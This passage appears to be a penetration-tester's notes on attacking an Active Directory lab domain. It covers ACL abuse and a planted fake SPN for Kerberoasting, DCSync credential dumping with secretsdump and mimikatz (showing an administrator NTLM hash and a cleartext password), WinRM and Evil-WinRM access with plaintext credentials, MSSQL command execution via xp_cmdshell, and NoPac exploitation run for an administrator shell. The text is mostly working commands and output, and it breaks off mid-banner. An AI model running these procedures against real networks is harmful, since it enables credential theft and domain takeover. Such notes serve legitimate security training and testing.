VERBOSE: [Add-DomainGroupMember] Adding member &#39;damundsen&#39; to group &#39;Help Desk Level 1&#39;</code></pre></div><p>Â </p><p>Â </p><p>Generic all</p><h4 id=creating-a-fake-spn>Creating a Fake SPN</h4><p>ACL Abuse Tactics</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname=&#39;notahacker/LEGIT&#39;} -Verbose

VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain &#39;INLANEFREIGHT&#39; from -Credential
VERBOSE: [Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
(&amp;(|(|(samAccountName=adunn)(name=adunn)(displayname=adunn))))
VERBOSE: [Set-DomainObject] Setting &#39;serviceprincipalname&#39; to &#39;notahacker/LEGIT&#39; for object &#39;adunn&#39;</code></pre></div><h4 id=kerberoasting-with-rubeus>Kerberoasting with Rubeus</h4><p>ACL Abuse Tactics</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; .\Rubeus.exe kerberoast /user:adunn /nowrap</code></pre></div><p>Â </p><p>Â </p><h1 id=dcsync>DCSync</h1><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; $sid= &#34;S-1-5-21-3842939050-3880317879-2865463114-1164&#34;
PS C:\local&gt; Get-ObjectAcl &#34;DC=inlanefreight,DC=local&#34; -ResolveGUIDs | ? { ($_.ObjectAceType -match &#39;Replication-Get&#39;)} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-498
ObjectAceType         : DS-Replication-Get-Changes

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-516
ObjectAceType         : DS-Replication-Get-Changes-All

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
ObjectAceType         : DS-Replication-Get-Changes-In-Filtered-Set

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight</code></pre></div><p>Â We can use the <code>-just-dc-ntlm</code> flag if we only want NTLM hashes or specify <code>-just-dc-user &lt;USERNAME></code> to only extract data for a specific user. Other useful options include <code>-pwd-last-set</code> to see when each account&rsquo;s password was last changed and <code>-history</code> if we want to dump password history, which may be helpful for offline password cracking or as supplemental data on domain password strength metrics for our client. The <code>-user-status</code> is another helpful flag to check and see if a user is disabled. We can dump the NTDS data with this flag and then filter out disabled users when providing our client with password cracking statistics to ensure that data such as:</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Password:
</span></span><span style=display:flex><span>[*] Target system bootKey: 0x0e79d2e5d9bad2639da4ef244b30fda5
</span></span><span style=display:flex><span>[*] Searching for NTDS.dit
</span></span><span style=display:flex><span>[*] Registry says NTDS.dit is at C:\Windows\NTDS\ntds.dit. Calling vssadmin to get a copy. This might take some time
</span></span><span style=display:flex><span>[*] Using smbexec method for remote execution
</span></span><span style=display:flex><span>[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
</span></span><span style=display:flex><span>[*] Searching for pekList, be patient
</span></span><span style=display:flex><span>[*] PEK # 0 found and decrypted: a9707d46478ab8b3ea22d8526ba15aa6
</span></span><span style=display:flex><span>[*] Reading and decrypting hashes from \\172.16.5.5\ADMIN$\Temp\HOLJALFD.tmp
</span></span></code></pre></div><p>Â </p><p>Â </p><p>Â </p><h4 id=viewing-an-account-with-reversible-encryption-password-storage-set>Viewing an Account with Reversible Encryption Password Storage Set</h4><p>Â </p><h4 id=enumerating-further-using-get-aduser>Enumerating Further using Get-ADUser</h4><p>DCSync</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Get-ADUser -Filter &#39;userAccountControl -band 128&#39; -Properties userAccountControl

DistinguishedName  : CN=PROXYAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
Enabled            : True
GivenName          :
Name               : PROXYAGENT
ObjectClass        : user
ObjectGUID         : c72d37d9-e9ff-4e54-9afa-77775eaaf334
SamAccountName     : proxyagent
SID                : S-1-5-21-3842939050-3880317879-2865463114-5222
Surname            :
userAccountControl : 640
UserPrincipalName  :</code></pre></div><p>Â </p><h4 id=checking-for-reversible-encryption-option-using-get-domainuser>Checking for Reversible Encryption Option using Get-DomainUser</h4><p>DCSync</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like &#39;*ENCRYPTED_TEXT_PWD_ALLOWED*&#39;} |select samaccountname,useraccountcontrol

samaccountname                         useraccountcontrol
--------------                         ------------------
proxyagent     ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT</code></pre></div><p>Â </p><p>Â </p><h4 id=displaying-the-decrypted-password>Displaying the Decrypted Password</h4><p>DCSync</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ cat inlanefreight_hashes.ntds.cleartext 
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
</span></span></code></pre></div><p>Â </p><p>Â </p><h4 id=displaying-the-decrypted-password-1>Displaying the Decrypted Password</h4><p>DCSync</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ cat inlanefreight_hashes.ntds.cleartext 
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
</span></span></code></pre></div><p>Â </p><p>Â </p><h4 id=performing-the-attack-with-mimikatz>Performing the Attack with Mimikatz</h4><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
 &#39;## v ##&#39;       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  &#39;#####&#39;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege &#39;20&#39; OK

mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
[DC] &#39;INLANEFREIGHT.LOCAL&#39; will be the domain
[DC] &#39;ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL&#39; will be the DC server
[DC] &#39;INLANEFREIGHT\administrator&#39; will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : administrator
User Principal Name  : administrator@inlanefreight.local
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 10/27/2021 6:49:32 AM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 88ad09182de639ccc6579eb0849751cf

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 4625fd0c31368ff4c255a3b876eaac3d

&lt;SNIP&gt;</code></pre></div><p>Â </p><p>Â </p><h1 id=non-privileged-access-non-domain>Non-Privileged Access (non domain)</h1><p>Â </p><p>Enumerate if the user in rdp local group (powerview)</p><h4 id=enumerating-the-remote-desktop-users-group>Enumerating the Remote Desktop Users Group</h4><p>Privileged Access</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName &#34;Remote Desktop Users&#34;

ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Desktop Users
MemberName   : INLANEFREIGHT\Domain Users
SID          : S-1-5-21-3842939050-3880317879-2865463114-513
IsGroup      : True
IsDomain     : UNKNOWN</code></pre></div><p>Â </p><p>Â </p><h4 id=checking-the-domain-users-groups-local-admin--execution-rights-using-bloodhound>Checking the Domain Users Group&rsquo;s Local Admin & Execution Rights using BloodHound</h4><p>Â </p><p><a href=#R-image-373fdc5fee6bcd60db4e871d3bba66c6 class=lightbox-link><img alt=d7cf00a2854f74d37010e5901c3ffea4.png class="lazy lightbox figure-image" loading=lazy src=../../resources/d7cf00a2854f74d37010e5901c3ffea4.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-373fdc5fee6bcd60db4e871d3bba66c6><img alt=d7cf00a2854f74d37010e5901c3ffea4.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/d7cf00a2854f74d37010e5901c3ffea4.png></a></p><p>Â </p><p>Â </p><h4 id=checking-remote-access-rights-using-bloodhound>Checking Remote Access Rights using BloodHound</h4><p>Â </p><p><a href=#R-image-59cb09a27498cd2fb612b367813c54c3 class=lightbox-link><img alt=599d1b6f7c32a9c4007d40eee6b59ccb.png class="lazy lightbox figure-image" loading=lazy src=../../resources/599d1b6f7c32a9c4007d40eee6b59ccb.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-59cb09a27498cd2fb612b367813c54c3><img alt=599d1b6f7c32a9c4007d40eee6b59ccb.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/599d1b6f7c32a9c4007d40eee6b59ccb.png></a></p><p>Â </p><p>We could also check the <code>Analysis</code> tab and run the pre-built queries <code>Find Workstations where Domain Users can RDP</code> or <code>Find Servers where Domain Users can RDP</code>.</p><p>Â </p><p>We can also utilize this custom <code>Cypher query</code> in BloodHound to hunt for users with this type of access. This can be done by pasting the query into the <code>Raw Query</code> box at the bottom of the screen and hitting enter.</p><p>Code: cypher</p><p>Â </p><p>Â </p><h2 id=winrm-bloodhound>WinRM (bloodhound)</h2><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cypher data-lang=cypher>MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]-&gt;(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]-&gt;(c:Computer) RETURN p2</code></pre></div><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; $password = ConvertTo-SecureString &#34;Klmcargo2&#34; -AsPlainText -Force
PS C:\local&gt; $cred = new-object System.Management.Automation.PSCredential (&#34;INLANEFREIGHT\forend&#34;, $password)
PS C:\local&gt; Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred

[ACADEMY-EA-MS01]: PS C:\Users\forend\Documents&gt; hostname
ACADEMY-EA-MS01
[ACADEMY-EA-MS01]: PS C:\Users\forend\Documents&gt; Exit-PSSession
PS C:\local&gt;</code></pre></div><p>Â </p><p>Â </p><h4 id=connecting-to-a-target-with-evil-winrm-and-valid-credentials>Connecting to a Target with Evil-WinRM and Valid Credentials</h4><p>Privileged Access</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ evil-winrm -i 10.129.201.234 -u forend
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Enter Password: 
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Evil-WinRM shell v3.3
</span></span></code></pre></div><p>Â </p><p>Â </p><h2 id=sql-server-admin>SQL Server Admin</h2><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cypher data-lang=cypher>MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]-&gt;(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]-&gt;(c:Computer) RETURN p2</code></pre></div><p>Â </p><p><a href=#R-image-2129ba8c22c733b2a8af2750303a9a1f class=lightbox-link><img alt=e4b32a0d9708d418c9177f6d9ffc5a00.png class="lazy lightbox figure-image" loading=lazy src=../../resources/e4b32a0d9708d418c9177f6d9ffc5a00.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-2129ba8c22c733b2a8af2750303a9a1f><img alt=e4b32a0d9708d418c9177f6d9ffc5a00.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/e4b32a0d9708d418c9177f6d9ffc5a00.png></a></p><p>Â </p><p>Â cypher query</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cypher data-lang=cypher>MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]-&gt;(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]-&gt;(c:Computer) RETURN p2</code></pre></div><p>Â </p><h4 id=enumerating-mssql-instances-with-powerupsql>Enumerating MSSQL Instances with PowerUpSQL</h4><p>Privileged Access</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; cd .\PowerUpSQL\
PS C:\local&gt;  Import-Module .\PowerUpSQL.ps1
PS C:\local&gt;  Get-SQLInstanceDomain

ComputerName     : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL
Instance         : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL,1433
DomainAccountSid : 1500000521000170152142291832437223174127203170152400
DomainAccount    : damundsen
DomainAccountCn  : Dana Amundsen
Service          : MSSQLSvc
Spn              : MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433
LastLogon        : 4/6/2022 11:59 AM</code></pre></div><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt;  Get-SQLQuery -Verbose -Instance &#34;172.16.5.150,1433&#34; -username &#34;inlanefreight\damundsen&#34; -password &#34;SQL1234!&#34; -query &#39;Select @@version&#39;

VERBOSE: 172.16.5.150,1433 : Connection Success.

Column1
-------
Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) ...</code></pre></div><p>Â </p><p>Â </p><h4 id=running-mssqlclientpy-against-the-target>Running mssqlclient.py Against the Target</h4><p>Privileged Access</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
</span></span><span style=display:flex><span>Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Password:
</span></span><span style=display:flex><span>[*] Encryption required, switching to TLS
</span></span><span style=display:flex><span>[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
</span></span><span style=display:flex><span>[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
</span></span><span style=display:flex><span>[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
</span></span><span style=display:flex><span>[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed database context to &#39;master&#39;.
</span></span><span style=display:flex><span>[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed language setting to us_english.
</span></span><span style=display:flex><span>[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
</span></span><span style=display:flex><span>[!] Press help for extra shell commands
</span></span></code></pre></div><p>Â </p><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>xp_cmdshell whoami /priv
</span></span><span style=display:flex><span>output                                                                             
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>--------------------------------------------------------------------------------   
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>NULL                                                                               
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>PRIVILEGES INFORMATION                                                             
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>----------------------                                                             
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>NULL                                                                               
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Privilege Name                Description                               State      
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>============================= ========================================= ========   
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>SeCreateGlobalPrivilege       Create global objects                     Enabled    
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>NULL
</span></span></code></pre></div><p>Â </p><h1 id=kerberos-double-hop-problem-in-winrm>Kerberos &ldquo;Double Hop&rdquo; Problem in winrm</h1><p><a href=#R-image-a3d890e7604d8429a77c2592bb210bf5 class=lightbox-link><img alt=620961720d911240c37bd3bbe2c35741.png class="lazy lightbox figure-image" loading=lazy src=../../resources/620961720d911240c37bd3bbe2c35741.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-a3d890e7604d8429a77c2592bb210bf5><img alt=620961720d911240c37bd3bbe2c35741.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/620961720d911240c37bd3bbe2c35741.png></a></p><p>So now, let&rsquo;s set up a PSCredential object and try again. First, we set up our authentication.</p><p>evil-winrm</p><p>Kerberos &ldquo;Double Hop&rdquo; Problem</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>*Evil-WinRM* PS C:\Users\backupadm\Documents&gt; $SecPassword = ConvertTo-SecureString &#39;!qazXSW@&#39; -AsPlainText -Force
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>|S-chain|-&lt;&gt;-127.0.0.1:9051-&lt;&gt;&lt;&gt;-172.16.8.50:5985-&lt;&gt;&lt;&gt;-OK
</span></span><span style=display:flex><span>|S-chain|-&lt;&gt;-127.0.0.1:9051-&lt;&gt;&lt;&gt;-172.16.8.50:5985-&lt;&gt;&lt;&gt;-OK
</span></span><span style=display:flex><span>*Evil-WinRM* PS C:\Users\backupadm\Documents&gt;  $Cred = New-Object System.Management.Automation.PSCredential(&#39;INLANEFREIGHT\backupadm&#39;, $SecPassword)
</span></span></code></pre></div><p>Â </p><p>Â </p><p>Now we can try to query the SPN accounts using PowerView and are successful because we passed our credentials along with the command.</p><p>Kerberos &ldquo;Double Hop&rdquo; Problem</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>*Evil-WinRM* PS C:\Users\backupadm\Documents&gt; get-domainuser -spn -credential $Cred | select samaccountname
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>|S-chain|-&lt;&gt;-127.0.0.1:9051-&lt;&gt;&lt;&gt;-172.16.8.50:5985-&lt;&gt;&lt;&gt;-OK
</span></span><span style=display:flex><span>|S-chain|-&lt;&gt;-127.0.0.1:9051-&lt;&gt;&lt;&gt;-172.16.8.50:5985-&lt;&gt;&lt;&gt;-OK
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>samaccountname
</span></span><span style=display:flex><span>--------------
</span></span><span style=display:flex><span>azureconnect
</span></span><span style=display:flex><span>backupjob
</span></span><span style=display:flex><span>krbtgt
</span></span><span style=display:flex><span>mssqlsvc
</span></span><span style=display:flex><span>sqltest
</span></span><span style=display:flex><span>sqlqa
</span></span><span style=display:flex><span>sqldev
</span></span><span style=display:flex><span>mssqladm
</span></span><span style=display:flex><span>svc_sql
</span></span><span style=display:flex><span>sqlprod
</span></span><span style=display:flex><span>sapsso
</span></span></code></pre></div><p>Â </p><p>enter-pssession</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm

 WARNING: When RunAs is enabled in a Windows PowerShell session configuration, the Windows security model cannot enforce
 a security boundary between different user sessions that are created by using this endpoint. Verify that the Windows
PowerShell runspace configuration is restricted to only the necessary set of cmdlets and capabilities.
WARNING: Register-PSSessionConfiguration may need to restart the WinRM service if a configuration using this name has
recently been unregistered, certain system data structures may still be cached. In that case, a restart of WinRM may be
 required.
All WinRM sessions connected to Windows PowerShell session configurations, such as Microsoft.PowerShell and session
configurations that are created with the Register-PSSessionConfiguration cmdlet, are disconnected.

   WSManConfig: Microsoft.WSMan.Management\WSMan::localhost\Plugin

Type            Keys                                Name
----            ----                                ----
Container       {Name=backupadmsess}                backupadmsess











Restart-Service WinRM
Enter-PSSession -ComputerName DEV01 -ConfigurationName backupadmsess</code></pre></div><p>Â </p><p>Â </p><p>Â check for <a href=https://www.crowdstrike.com/blog/cve-2020-1472-zerologon-security-advisory/ rel=external>Zerologon</a> or <a href=https://stealthbits.com/blog/what-is-a-dcshadow-attack-and-how-to-defend-against-it/ rel=external>DCShadow</a>.</p><h2 id=petitpotam-ms-efsrpc>PetitPotam (MS-EFSRPC)</h2><h2 id=nopac-samaccountname-spoofing>NoPac (SamAccountName Spoofing)</h2><p>Â </p><h4 id=scanning-for-nopac>Scanning for NoPac</h4><p>Bleeding Edge Vulnerabilities</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>â–ˆâ–ˆâ–ˆ    â–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ 
</span></span><span style=display:flex><span>â–ˆâ–ˆâ–ˆâ–ˆ   â–ˆâ–ˆ â–ˆâ–ˆ    â–ˆâ–ˆ â–ˆâ–ˆ   â–ˆâ–ˆ â–ˆâ–ˆ   â–ˆâ–ˆ â–ˆâ–ˆ      
</span></span><span style=display:flex><span>â–ˆâ–ˆ â–ˆâ–ˆ  â–ˆâ–ˆ â–ˆâ–ˆ    â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆ      
</span></span><span style=display:flex><span>â–ˆâ–ˆ  â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆ    â–ˆâ–ˆ â–ˆâ–ˆ      â–ˆâ–ˆ   â–ˆâ–ˆ â–ˆâ–ˆ      
</span></span><span style=display:flex><span>â–ˆâ–ˆ   â–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆ      â–ˆâ–ˆ   â–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ 
</span></span><span style=display:flex><span>                                           
</span></span><span style=display:flex><span>[*] Current ms-DS-MachineAccountQuota = 10
</span></span><span style=display:flex><span>[*] Got TGT with PAC from 172.16.5.5. Ticket size 1484
</span></span><span style=display:flex><span>[*] Got TGT from ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL. Ticket size 663
</span></span></code></pre></div><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>â–ˆâ–ˆâ–ˆ    â–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ 
</span></span><span style=display:flex><span>â–ˆâ–ˆâ–ˆâ–ˆ   â–ˆâ–ˆ â–ˆâ–ˆ    â–ˆâ–ˆ â–ˆâ–ˆ   â–ˆâ–ˆ â–ˆâ–ˆ   â–ˆâ–ˆ â–ˆâ–ˆ      
